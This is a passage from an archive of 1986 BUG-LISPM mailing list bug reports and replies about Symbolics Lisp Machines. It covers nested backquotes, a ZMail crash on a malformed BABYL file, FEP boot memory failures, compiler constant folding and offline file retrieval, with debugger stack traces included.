While in the function (:METHOD FS:NFILE-SERVER-UNIT :WAIT-FOR-COMMAND)  (:METHOD FS:NFILE-SERVER-UNIT :SEND-AND-WAIT-FOR-COMMAND)  (:METHOD FS:NFILE-SERVER-UNIT :SEND-IN-COMMAND-CONDITION-ENVIRONMENT)

(:METHOD FS:NFILE-SERVER-UNIT :WAIT-FOR-COMMAND):  (P.C. = 65)
   Arg 0 (SELF): #<NFILE-SERVER-UNIT 14122551>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FS:NFILE-SERVER-UNIT -- 15. IV's, 0. FL's 120223317>
   Arg 2 (SI:OPERATION): :WAIT-FOR-COMMAND
   Arg 3 (FS:TID-CONS-ARGS): ("T4839" :OPEN "Probe" NIL)
   Local 4 (FS:DATA-CHANNEL): NIL
   Local 5 (FS:COMMAND-TID): "T4839"
   Local 6 (FS:COMMAND-NAME): :OPEN
   Local 7 (FS:WHOSTATE): "Probe"
   Local 8 (FS:RESPONSE-ARGS): ("FNF" (:PATHNAME ">relatus>gnoscere>deictic-interface.lisp.NEWEST") "The file was not found.")
   Local 9 (FS:RESPONSE-NAME): :ERROR

(:METHOD FS:NFILE-SERVER-UNIT :SEND-AND-WAIT-FOR-COMMAND):  (P.C. = 40)
   Arg 0 (SELF): #<NFILE-SERVER-UNIT 14122551>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FS:NFILE-SERVER-UNIT -- 15. IV's, 0. FL's 120223317>
   Arg 2 (SI:OPERATION): :SEND-AND-WAIT-FOR-COMMAND
   Arg 3 (FS:DATA): (:OPEN "Probe" NIL NIL ">relatus>gnoscere>deictic-interface.lisp.NEWEST" :PROBE NIL)

(:METHOD FS:NFILE-SERVER-UNIT :SEND-IN-COMMAND-CONDITION-ENVIRONMENT):  (P.C. = 54)
   Arg 0 (SELF): #<NFILE-SERVER-UNIT 14122551>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FS:NFILE-SERVER-UNIT -- 15. IV's, 0. FL's 120223317>
   Arg 2 (SI:OPERATION): :SEND-IN-COMMAND-CONDITION-ENVIRONMENT
   Arg 3 (FS:MESSAGE): :SEND-AND-WAIT-FOR-COMMAND
   Arg 4 (FS:DATA): (:OPEN "Probe" NIL NIL ">relatus>gnoscere>deictic-interface.lisp.NEWEST" :PROBE NIL)

(:METHOD FS:NFILE-SERVER-UNIT :COMMAND):  (P.C. = 7)
   Arg 0 (SELF): #<NFILE-SERVER-UNIT 14122551>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FS:NFILE-SERVER-UNIT -- 15. IV's, 0. FL's 120223317>
   Arg 2 (SI:OPERATION): :COMMAND
   Rest arg (FS:DATA): (:OPEN "Probe" NIL NIL ">relatus>gnoscere>deictic-interface.lisp.NEWEST" :PROBE NIL)

FS:NFILE-KEYWORD-LIST-CALLER:  (P.C. = 165)
   Arg 0 (FS:INSTANCE): #<NFILE-SERVER-UNIT 14122551>
   Arg 1 (FS:CMDNAME): :OPEN
   Arg 2 (FS:WHOSTATE): "Probe"
   Arg 3 (FS:DATA-CHANNEL): NIL
   Arg 4 (FS:CONSTANT-ARGS): (NIL ">relatus>gnoscere>deictic-interface.lisp.NEWEST" :PROBE NIL)
   Local 4 (FS:CONSTANT-ARGS): NIL
   Arg 5 (FS:KEYWORD-VALUE-PAIRS): (:BYTE-SIZE NIL :DELETED NIL :RAW NIL :SUPER-IMAGE NIL :PRESERVE-DATES NIL ...)
   Local 5 (FS:KEYWORD-VALUE-PAIRS): NIL

(:METHOD FS:NFILE-ACCESS-PATH :OPEN):  (P.C. = 375)
   Arg 0 (SELF): #<LMFS-NFILE-ACCESS-PATH B using NFILE 14122571>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FS:NFILE-ACCESS-PATH -- 4. IV's, 2. FL's 146561447>
   Arg 2 (SI:OPERATION): :OPEN
   Arg 3 (FS:REAL-PATHNAME): #<LMFS-PATHNAME "B:>relatus>gnoscere>deictic-interface.lisp">
   Arg 4 (FS:COMMAND-PATHNAME): #<LOGICAL-PATHNAME "RL: GNOSCERE; DEICTIC-INTERFACE.LISP.NEWEST">
   Rest arg: (:DIRECTION :PROBE)

(:METHOD FS:ACTIVE-PATHNAME-MIXIN :OPEN):  (P.C. = 14)
   Arg 0 (SELF): #<LMFS-PATHNAME "B:>relatus>gnoscere>deictic-interface.lisp">
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FS:ACTIVE-PATHNAME-MIXIN -- 1. IV's, 0. FL's 120157311>
   Arg 2 (SI:OPERATION): :OPEN
   Arg 3 (FS:PATHNAME): #<LOGICAL-PATHNAME "RL: GNOSCERE; DEICTIC-INTERFACE.LISP.NEWEST">
   Rest arg (FS:OPTIONS): (:DIRECTION :PROBE)

(:DEFUN-METHOD FS:LOGICAL-PATHNAME-PASS-ON):  (P.C. = 10)
   Arg 0 (SELF): #<LOGICAL-PATHNAME "RL: GNOSCERE; DEICTIC-INTERFACE.LISP.NEWEST">
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FS:LOGICAL-PATHNAME -- 8. IV's, 3. FL's 120045753>
   Arg 2 (FS:MESSAGE): :OPEN
   Rest arg (FS:REST): (#<LOGICAL-PATHNAME "RL: GNOSCERE; DEICTIC-INTERFACE.LISP.NEWEST"> :DIRECTION :PROBE)

Rest of stack:
(:METHOD FS:LOGICAL-PATHNAME :OPEN):  (P.C. = 10)
FS:COMMON-LISP-OPEN:  (P.C. = 450)
OPEN:  (P.C. = 257)
SI:SYSTEM-GET-CREATION-DATE:  (P.C. = 72)
SI:FILE-NEWER-THAN-FILE-P:  (P.C. = 3)
SI:QUEUE-FILES-AS-NEEDED:  (P.C. = 46)
SI:QUEUE-ONE-TRANSFORMATION:  (P.C. = 33)
SI:PERFORM-TRANSFORMATIONS:  (P.C. = 122)
SI:PERFORM-TRANSFORMATIONS:  (P.C. = 64)
MAKE-SYSTEM:  (P.C. = 241)
SI:*EVAL:  (P.C. = 401)
TV:MOUSE-SENSITIVE-EVAL-FOR-LISP-COMMAND-LOOP:  (P.C. = 115)  (from RL: UTILS; WMAGIC)
(:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0):  (P.C. = 152)
TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
SI:LISP-COMMAND-LOOP:  (P.C. = 67)
TV:RELATUS-LISTENER-TOP-LEVEL1:  (P.C. = 31)  (from RL: UTILS; WMAGIC)
SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
17-Feb-86 21:42:19-EST,991;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 17 Feb 86 21:42-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 17 FEB 86  21:06:56 EST
Received: from MIT-MORRISON.ARPA by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 23115; Mon 17-Feb-86 21:06:41-EST
Date: Mon, 17 Feb 86 21:06 EST
From: JCMA@MIT-AI.ARPA
Subject: How about fixing bogus compiler warning for misspelling or fix the manual?
To: BUG-LISPM@MIT-REAGAN.ARPA
Message-ID: <860217210609.3.JCMA@MIT-MORRISON.ARPA>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 11.12, Experimental RELATUS 146.0, microcode TMC5-MIC 336,
FEP 127, FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

  For Flavor ST-NODE
    Misspelled :OUTSIDE-ACCESSIBLE-INSTANCE-VARIABLES NAME BELIEF-SYSTEM 
  
  For Flavor LT-NODE
    Misspelled :OUTSIDE-ACCESSIBLE-INSTANCE-VARIABLES NAME BELIEF-SYSTEM 
18-Feb-86 04:07:04-EST,2079;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 18 Feb 86 04:07-EST
Received: from SCRC-STONY-BROOK.ARPA by MIT-ZERMATT.ARPA via INTERNET with SMTP id 24815; 18 Feb 86 04:06:31-EST
Received: from SWALLOW.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 418910; Tue 18-Feb-86 02:52:53-EST
Date: Tue, 18 Feb 86 02:52 EST
From: Michael Greenwald <Greenwald@SCRC-STONY-BROOK.ARPA>
Subject: nested backquotes mess up
To: DAM@OZ.AI.MIT.EDU, BUG-LISPM@MIT-ZERMATT.ARPA
In-Reply-To: <860216145805.1.DAM@JOE-LOUIS.MIT.EDU>
Message-ID: <860218025233.4.GREENWALD@SWALLOW.SCRC.Symbolics.COM>

    Date: Sun, 16 Feb 86 14:58 EST
    From: David A. McAllester <DAM@OZ.AI.MIT.EDU>

    In Symbolics 3600 Release 6.1, IP-TCP 29.13, Experimental McFlavors 5.0,
    microcode TMC5-MIC 336, FEP 17, on Lisp Machine Joe Louis:

    consider the following

    (setq x 'a)
    (setq y 'b)
    (setq z '(c d))

    (setq args '(x y z))

    (eval ``,(list* ,@args))

    ;``,(list* ,@args) should evaluate to `,(list* x y z) which should
    evaluate to (a b c d)

According to CLtL (pg 349-350) ``,(list* ,@args) is the same as
`(list* ,@args) which reads in as some form which, *when evaluated*,
yields (list* x y z). Putting only one eval around it returns (a b c d),
not (eval (a b c d)).  I couldn't tell if this is what you meant and
you had a typo above, or we each understand CLtL differently.

(The release 6 documentation is not as clear as CLtL on this point, but I
think from now on we will follow the definition in Steele's book.)

    ;instead the system evaluates (si:xr-bq-cons x y z) which gives an error.

In any case, there's a bug here: the reader is being too clever by half
when it sees LIST, LIST*, CONS, APPEND, and company, inside backquoted
lists.  

    >>Error: Incorrect arguments to SI:XR-BQ-CONS:
	     The macro's argument pattern (CAR CDR)
	     does not match the form (SI:XR-BQ-CONS USER:X USER:Y USER:Z).
    While in the function SI:XR-BQ-CONS  FUNCALL  SI:EVAL-MACRO


18-Feb-86 21:04:35-EST,5680;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 18 Feb 86 21:04-EST
Received: from VIOLIN.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 24904; Tue 18-Feb-86 20:46:31-EST
Date: Tue, 18 Feb 86 20:46 EST
From: Richard E. Zippel <RZ@MIT-ZERMATT.ARPA>
Subject: ZMAIL problems
To: BUG-LISPM@MIT-ZERMATT.ARPA, bug-ti-explorer-local@MIT-ZERMATT.ARPA
Message-ID: <860218204633.9.RZ@VIOLIN.LCS.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, Macsyma 318.12,
6-1-Patches 1.10, MLSite 12.2, Experimental XML 1.11,
Experimental Schema 107.4, microcode TMC5-IO4-ST506-MIC 336, FEP 127,
FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Violin:

Screwing around with an Explorer I ended up with my mail file being
converted into a ``babyl'' file in Z:>JMA>BABYL.TEXT.  Here's the first
few lines of the file.

    BABYL OPTIONS:
    Mail: Z:>rz>mail.text.NEWEST
    
    
    
    0, UNSEEN, RECENT,,
    *** EOOH ***
    Received: from MIT-MC.ARPA by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 24883; Tue 18-Feb-86 17:26:40-EST
    Received: from OZ.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 18 FEB 86  17:26:36 EST
    Received: from 13112 by OZ.AI.MIT.EDU via Chaosnet; 18 Feb 86 17:22-EST
    Date: Tue, 18 Feb 86 17:24 EST
    

As you can see it violates the BABYL format by leaving out Version
specifier.  This seems to cause the 3600 to fail to be unable to read
the buffer (it defaults to NIL).  It would be nice if it 3600 ZMail
would default it to 5 or something more reasonable to avoid this problem,
especially with this sort of software around.    


>>Trap: The first argument given to the SYS:INTERNAL-< instruction, NIL, was not a number.
While in the function (:METHOD ZWEI:BABYL-BUFFER :BEFORE :PARSE-MSG)  (:METHOD ZWEI:BABYL-BUFFER :COMBINED :PARSE-MSG)  ZWEI:ASSURE-MSG-PARSED

(:METHOD ZWEI:BABYL-BUFFER :BEFORE :PARSE-MSG):  (P.C. = 111)
   Arg 0 (SELF): #<BABYL-BUFFER "Z:>JMA>BABYL.TEXT" 44570554>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:BABYL-BUFFER -- 3. IV's, 6. FL's 120511737>
   Arg 2 (SI:OPERATION): :PARSE-MSG
   Arg 3 (ZWEI:MSG): #<MSG 20757527>
   Arg 4 (ZWEI:STAT): #<DTP-LOCATIVE 20757537>
   Local 5: NIL
   Local 6 (ZWEI:START-BP): ("0, UNSEEN, RECENT,," 0 :NORMAL)
   Local 7 (ZWEI:END-BP): ("" 0 :MOVES)
   Local 8 (ZWEI:REAL-START-LINE): "0, UNSEEN, RECENT,,"
   Local 9 (ZWEI:END-LINE): ""
   Local 10 (ZWEI:START-LINE): "0, UNSEEN, RECENT,,"

(:METHOD ZWEI:BABYL-BUFFER :COMBINED :PARSE-MSG):  (P.C. = 10)
   Arg 0 (SELF): #<BABYL-BUFFER "Z:>JMA>BABYL.TEXT" 44570554>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:BABYL-BUFFER -- 3. IV's, 6. FL's 120511737>
   Arg 2 (SI:.OPERATION.): :PARSE-MSG
   Rest arg (SI:.DAEMON-CALLER-ARGS.): (#<MSG 20757527> #<DTP-LOCATIVE 20757537>)

ZWEI:ASSURE-MSG-PARSED:  (P.C. = 60)
   Arg 0 (ZWEI:MSG): #<MSG 20757527>
   --Defaulted args:--
   Arg 1 (ZWEI:KILLED-OK): NIL

ZWEI:ZMAIL-SELECT-MSG:  (P.C. = 132)
   Arg 0 (ZWEI:MSG): #<MSG 20755501>
   Local 0 (ZWEI:MSG): NIL
   Arg 1 (ZWEI:NO-ERROR-P): T
   Arg 2 (ZWEI:SAVE-POINT-P): NIL
   --Defaulted args:--
   Arg 3 (ZWEI:MARK-SEEN): T

ZWEI:SELECT-SEQUENCE:  (P.C. = 144)
   Arg 0 (ZWEI:SEQUENCE): #<BABYL-BUFFER "Z:>JMA>BABYL.TEXT" 44570554>
   --Defaulted args:--
   Arg 1 (ZWEI:DEFAULT-TOO): NIL
   Arg 2 (ZWEI:MSG-TOO): T
   Arg 3 (ZWEI:SAVE-POINT): T

ZWEI:COM-ZMAIL-SELECT:  (P.C. = 65)

ZWEI:COMMAND-EXECUTE:  (P.C. = 57)
   Arg 0 (ZWEI:COMMAND): ZWEI:COM-ZMAIL-SELECT
   Arg 1 (ZWEI:CHAR): (:MENU ("Select" . ZWEI:COM-ZMAIL-SELECT) 4 #<ZMAIL-MAIN-COMMAND-MENU-PANE Zmail Main Command Menu Pane 5 43207055 exposed>)
   --Defaulted args:--
   Arg 2 (ZWEI:PREFIX-CHAR): NIL
   Arg 3 (ZWEI:HOOK-LIST): NIL

ZWEI:ZMAIL-COMMAND-EXECUTE:  (P.C. = 6)
   Arg 0: ZWEI:COM-ZMAIL-SELECT

(:INTERNAL ZWEI:ZMAIL-COMMAND-LIST 0 (:MENU)):  (P.C. = 10)
   Arg 0 (SI:**DEFSELECT-OP**): :MENU
   Arg 1 (ZWEI:ITEM): ("Select" . ZWEI:COM-ZMAIL-SELECT)
   Arg 2 (ZWEI:CH): 4
   Arg 3 (ZWEI:WINDOW): #<ZMAIL-MAIN-COMMAND-MENU-PANE Zmail Main Command Menu Pane 5 43207055 exposed>

ZWEI:ZMAIL-COMMAND-LIST:  (P.C. = 12)
   Arg 0 (SI:OPERATION): :MENU
   Rest arg (SI:SELECT-METHOD-ARGS): (("Select" . ZWEI:COM-ZMAIL-SELECT) 4 #<ZMAIL-MAIN-COMMAND-MENU-PANE Zmail Main Command Menu Pane 5 43207055 exposed>)

(:METHOD ZWEI:ZMAIL-FRAME :PROCESS-SPECIAL-COMMAND):  (P.C. = 16)
   Arg 0 (SELF): #<ZMAIL-FRAME Main Zmail Window 43200325 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMAIL-FRAME -- 66. IV's, 20. FL's 146565661>
   Arg 2 (SI:OPERATION): :PROCESS-SPECIAL-COMMAND
   Rest arg (ARGS): (:MENU ("Select" . ZWEI:COM-ZMAIL-SELECT) 4 #<ZMAIL-MAIN-COMMAND-MENU-PANE Zmail Main Command Menu Pane 5 43207055 exposed>)

(:METHOD ZWEI:ZMAIL-FRAME :COMMAND-LOOP):  (P.C. = 136)
   Arg 0 (SELF): #<ZMAIL-FRAME Main Zmail Window 43200325 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMAIL-FRAME -- 66. IV's, 20. FL's 146565661>
   Arg 2 (SI:OPERATION): :COMMAND-LOOP

(:METHOD ZWEI:ZMAIL-FRAME :COMBINED :COMMAND-LOOP):  (P.C. = 70)
   Arg 0 (SELF): #<ZMAIL-FRAME Main Zmail Window 43200325 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMAIL-FRAME -- 66. IV's, 20. FL's 146565661>
   Arg 2 (SI:.OPERATION.): :COMMAND-LOOP
   Rest arg (SI:.DAEMON-CALLER-ARGS.): NIL

ZWEI:ZMAIL-PROCESS-TOP-LEVEL:  (P.C. = 105)
   Arg 0 (ZWEI:WINDOW): #<ZMAIL-FRAME Main Zmail Window 43200325 exposed>

SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
   --Defaulted args:--
   Arg 0 (IGNORE): NIL
19-Feb-86 11:32:30-EST,1059;000000000000
Received: from XX.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 19 Feb 86 11:30-EST
Date: Wed 19 Feb 86 11:31:54-EST
From: Ken Traub <KT@XX.LCS.MIT.EDU>
Subject: Problem with FEP
To: bug-lispm@OZ.AI.MIT.EDU
Message-ID: <12184633689.46.KT@XX.LCS.MIT.EDU>

Hi,
	We have 8 3600-family lispms.  A world built upon release 6.1 was
recently dumped and ported to these machines.  Booting on this world causes
a problem with one machine:  after the fep prints the "load world" command,
it says "request for 752 longs failed" and goes back to the prompt (it might
actually be a different number than 752).  What is unusual is that this happens
even if the "boot" command is given immediately after doing a "reset fep".
The machine can be booted by typing the commands by hand.  This problem does
not happen with the other seven machines.
	I might point out that the problematic machine has only 1M of physical
memory, while the others have at least 1.5M.
	Any ideas on why this is happening?  Thanks in advance for your replies.
					--- Ken
-------
19-Feb-86 16:53:22-EST,716;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 19 Feb 86 16:38-EST
Received: from ROCKY-GRAZIANO.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 24995; Wed 19-Feb-86 16:39:48-EST
Date: Wed, 19 Feb 86 16:39 EST
From: David A. McAllester <DAM@OZ.AI.MIT.EDU>
Subject: nested backquotes mess up
To: Greenwald@SCRC-STONY-BROOK.ARPA, DAM@OZ.AI.MIT.EDU,
    BUG-LISPM@MIT-ZERMATT.ARPA
In-Reply-To: <860218025233.4.GREENWALD@SWALLOW.SCRC.Symbolics.COM>
Message-ID: <860219163952.1.DAM@ROCKY-GRAZIANO.LCS.MIT.EDU>


(eval ``,(list* ,@args)) should yield the list (a b c d),
that is what I intended.  My explanation of why (a b c d)
is the correct value seems to have been wrong.
19-Feb-86 17:48:07-EST,2265;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 19 Feb 86 17:46-EST
Received: from SCRC-STONY-BROOK.ARPA by MC.LCS.MIT.EDU 19 Feb 86 17:46:42 EST
Received: from WOODPECKER.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 420470; Wed 19-Feb-86 13:52:11-EST
Date: Wed, 19 Feb 86 13:54 EST
From: Gerry Smith <gsmith@SCRC-YUKON.ARPA>
Subject: Problem with FEP
To: Ken Traub <KT@XX.LCS.MIT.EDU>, bug-lispm@OZ.AI.MIT.EDU
In-Reply-To: <12184633689.46.KT@XX.LCS.MIT.EDU>
Message-ID: <860219135418.5.GSMITH@WOODPECKER.SCRC.Symbolics.COM>

    Date: Wed 19 Feb 86 11:31:54-EST
    From: Ken Traub <KT@XX.LCS.MIT.EDU>

    Hi,
	    We have 8 3600-family lispms.  A world built upon release 6.1 was
    recently dumped and ported to these machines.  Booting on this world causes
    a problem with one machine:  after the fep prints the "load world" command,
    it says "request for 752 longs failed" and goes back to the prompt (it might
    actually be a different number than 752).  What is unusual is that this happens
    even if the "boot" command is given immediately after doing a "reset fep".
    The machine can be booted by typing the commands by hand.  This problem does
    not happen with the other seven machines.

This is a known problem, without a really good solution.  The problem is
that the FEP is running out of memory, and can't get a packet that's 752
words in length.  The reason that typing the problem in by hand works is
because opening a file uses up memory, as does reading the file and
dispatching on each command in the file.  Some people have also found
that resetting the FEP (and thereby starting off with a clean slate
memory-management-wise) sometimes helps.  That doesn't sound useful in
your case.

The problem is helped a little bit by using the new FEP system, NFEP
V127 -- but you'll still see the problem at times.  The real problem is
that the (n)fep is a processor with limited physical memory and no
virtual memory.

	    I might point out that the problematic machine has only 1M of physical
    memory, while the others have at least 1.5M.
	    Any ideas on why this is happening?  Thanks in advance for your replies.
					    --- Ken
    -------

19-Feb-86 18:28:40-EST,3038;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 19 Feb 86 18:28-EST
Received: from MINNIE-MOUSE.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 25008; Wed 19-Feb-86 18:29:19-EST
Date: Wed, 19 Feb 86 18:29 EST
From: John M. Lucassen <LUCASSEN@MIT-XX.ARPA>
Subject: Screen blinking
To: BUG-LISPM@MIT-ZERMATT.ARPA
Message-ID: <"860219182918.1.lucassen@XX"@MINNIE-MOUSE.MIT.EDU>

 I don't know how to reproduce this bug, but it may have to do with the
fact that I changed the deexposed action of several windows (zmacs, lisp
and the document examiner) to continue execution in the background. 
 The symptom: screen blinking in emacs (but not in the other windows),
occasionally interrupted by a notification that emacs wants to type out
(which halted the blinking until confirmed with a space).
 Good luck.


In Symbolics 3600 Release 6.1, IP-TCP 29.13, microcode TMC5-MIC 336,
FEP 18, on Lisp Machine Minnie Mouse:



>>Break: 
While in the function (:METHOD TV:SHEET :BEEP)  (:METHOD TV:SHEET :BEEP)  (:METHOD TV:SHEET :BEEP)

(:METHOD TV:SHEET :BEEP):
   Arg 0 (SELF): #<ZMACS-FRAME Zmacs Frame 1 43201703 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TV:SHEET -- 0. IV's, 1. FL's 120270077>
   Arg 2 (SI:OPERATION): :BEEP
   Arg 3 (TV:BEEP-TYPE): NIL

(:METHOD TV:SHEET :BEEP):  (P.C. = 10)
   Arg 0 (SELF): #<ZMACS-MODE-LINE-WINDOW Zmacs Mode Line Window 2 43201763 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TV:SHEET -- 0. IV's, 1. FL's 120111724>
   Arg 2 (SI:OPERATION): :BEEP
   Arg 3 (TV:BEEP-TYPE): NIL

(:METHOD TV:SHEET :BEEP):  (P.C. = 10)
   Arg 0 (SELF): #<TYPEIN-WINDOW Typein Window 2 43202076 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TV:SHEET -- 0. IV's, 1. FL's 120740105>
   Arg 2 (SI:OPERATION): :BEEP
   --Defaulted args:--
   Arg 3 (TV:BEEP-TYPE): NIL

SYS:DISPLAY-NOTIFICATION:  (P.C. = 13)
   Arg 0 (TV:STREAM): #<TYPEIN-WINDOW Typein Window 2 43202076 exposed>
   Arg 1 (TV:NOTE): (2718228278 "Process ZMACS-WINDOWS wants typein" #<ZMACS-WINDOW-PANE Zmacs Window Pane 1 43202655 deexposed>)
   Arg 2 (TV:STYLE): :WINDOW
   --Defaulted args:--
   Arg 3 (TV:WINDOW-WIDTH): NIL

ZWEI:EDITOR-INPUT:  (P.C. = 205)
   Rest arg: (:ANY-TYI T :NOTIFICATION T)

(:METHOD ZWEI:EDITOR :EDIT):  (P.C. = 173)
   Arg 0 (SELF): #<ZMACS-TOP-LEVEL-EDITOR 144776776>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:EDITOR -- 12. IV's, 0. FL's 120377766>
   Arg 2 (SI:OPERATION): :EDIT
   --Defaulted args:--
   Arg 3 (ZWEI:TOP-LEVEL-P): T
   Arg 4 (ZWEI:DESCRIPTION): NIL

(:METHOD ZWEI:TOP-LEVEL-EDITOR :COMBINED :EDIT):  (P.C. = 60)
   Arg 0 (SELF): #<ZMACS-TOP-LEVEL-EDITOR 144776776>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:TOP-LEVEL-EDITOR -- 13. IV's, 1. FL's 120377366>
   Arg 2 (SI:.OPERATION.): :EDIT
   Rest arg (SI:.DAEMON-CALLER-ARGS.): NIL

ZWEI:ZMACS-WINDOW-TOP-LEVEL:  (P.C. = 51)

SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
   Arg 0 (IGNORE): NIL
20-Feb-86 12:17:20-EST,827;000000000000
Received: from OTIS.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 20 Feb 86 12:17-EST
Date: Thu, 20 Feb 86 12:17 EST
From: David Chapman <Zvona@OZ.AI.MIT.EDU>
Subject: the compiler doesn't constant-fold
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860220121756.1.ZVONA@OTIS.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 13.2, Macsyma 310.35, microcode TMC5-IO4-ST506-MIC 336, FEP 127,
FEP0:>V127-LISP.FLOD(2), FEP0:>V127-LOADERS.FLOD(3),
FEP0:>V127-INFO.FLOD(2), FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Otis Redding:

(defun foo (x)
  (+ 0 x))

(disasemble 'foo)
  0  ENTRY: 1 REQUIRED, 0 OPTIONAL
  1  PUSH-IMMED 0
  2  BUILTIN +-INTERNAL STACK FP|0      ;X
  3  RETURN-STACK 

I wrote a macro that generated (+ 0 ...) a lot.  

This optimization is pretty elementary...
20-Feb-86 13:32:35-EST,725;000000000000
Received: from OTIS.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 20 Feb 86 13:30-EST
Date: Thu, 20 Feb 86 13:31 EST
From: David Chapman <Zvona@OZ.AI.MIT.EDU>
Subject: dtp-array is not in global; other trivial manual bug
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860220133146.2.ZVONA@OTIS.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 13.2, Macsyma 310.35, microcode TMC5-IO4-ST506-MIC 336, FEP 127,
FEP0:>V127-LISP.FLOD(2), FEP0:>V127-LOADERS.FLOD(3),
FEP0:>V127-INFO.FLOD(2), FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Otis Redding:

dtp-array is in sys:, not global:.  Weird.  Also, on p. 13 of vol 8,
under sys:*data-types*, there is a colon missing in the body of the
text.
20-Feb-86 14:40:21-EST,1046;000000000000
Received: from CROSBY.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 20 Feb 86 14:40-EST
Date: Thu, 20 Feb 86 14:40 EST
From: Reid G. Simmons <REID@OZ.AI.MIT.EDU>
Subject: Offline files
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860220144046.1.REID@CROSBY.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 13.2, Macsyma 310.35, microcode TMC5-IO4-ST506-MIC 336, FEP 127,
FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Bing Crosby:

It seems to be the case that, in reading files from OZ (either in the
editor or at lisp top level), the system will hang if the file is
offline.  Then after aborting from the read/load, the system will no
longer read in any files (it hangs with the wholine reading ``Open'').

My questions are:
a) is that what is actually happening?
b) how can I reset the world so that future reads happen correctly
   (Up until now, I have just been logging out and logging back in)

Thanks,
Reid Simmons
20-Feb-86 15:57:32-EST,1426;000000000000
Mail-From: CJL created at 20-Feb-86 15:57:13
Date: Thu, 20 Feb 1986  15:57 EST
Message-ID: <CJL.12184944131.BABYL@MIT-OZ>
From: Chris Lindblad <CJL@OZ.AI.MIT.EDU>
To:   "Reid G. Simmons" <REID@OZ.AI.MIT.EDU>
Cc:   BUG-LISPM@OZ.AI.MIT.EDU
Subject: Offline files
In-reply-to: Msg of 20 Feb 1986  14:40-EST from Reid G. Simmons <REID at OZ.AI.MIT.EDU>

    Date: Thursday, 20 February 1986  14:40-EST
    From: Reid G. Simmons <REID at OZ.AI.MIT.EDU>

    It seems to be the case that, in reading files from OZ (either in the
    editor or at lisp top level), the system will hang if the file is
    offline.  Then after aborting from the read/load, the system will no
    longer read in any files (it hangs with the wholine reading ``Open'').

    My questions are:
    a) is that what is actually happening?

Not really. Your lispm is not permanently hanging. Oz is trying to
retrieve the files from pig. This takes 15 to 120 seconds. If OZ can't
retrieve the file, then you will get the "offline" error. If OZ can
retrieve the file, then everythings fine.

    b) how can I reset the world so that future reads happen correctly
